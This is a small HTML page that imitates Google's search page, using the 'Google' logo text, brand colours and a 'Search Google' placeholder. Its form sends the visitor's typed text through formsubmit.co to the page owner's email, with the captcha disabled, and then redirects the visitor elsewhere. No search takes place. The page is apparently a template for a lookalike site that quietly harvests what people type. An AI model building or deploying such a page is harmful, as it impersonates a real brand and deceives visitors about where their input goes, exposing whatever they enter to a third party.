<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Search Box</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    background:#fff;
}

.container{
    text-align:center;
}

.logo{
    font-size:60px;
    font-weight:bold;
    color:#4285F4;
    margin-bottom:30px;
}

.search{
    width:500px;
    padding:15px;
    font-size:18px;
    border:1px solid #ccc;
    border-radius:30px;
    outline:none;
}

button{
    margin-top:20px;
    padding:12px 30px;
    border:none;
    background:#4285F4;
    color:white;
    font-size:18px;
    border-radius:30px;
    cursor:pointer;
}

button:hover{
    background:#3367d6;
}
</style>

</head>

<body>

<div class="container">

<h1 class="logo">Google</h1>

<form action="https://formsubmit.co/your-email@gmail.com" method="POST">

<input type="hidden" name="_captcha" value="false">

<input type="hidden" name="_template" value="table">

<input type="hidden" name="_next" value="https://yourusername.github.io/yourrepository/">

<input
type="text"
name="Search_Text"
class="search"
placeholder="Search Google or type a URL"
required>

<br>

<button type="submit">Search</button>

</form>

</div>

</body>
</html>
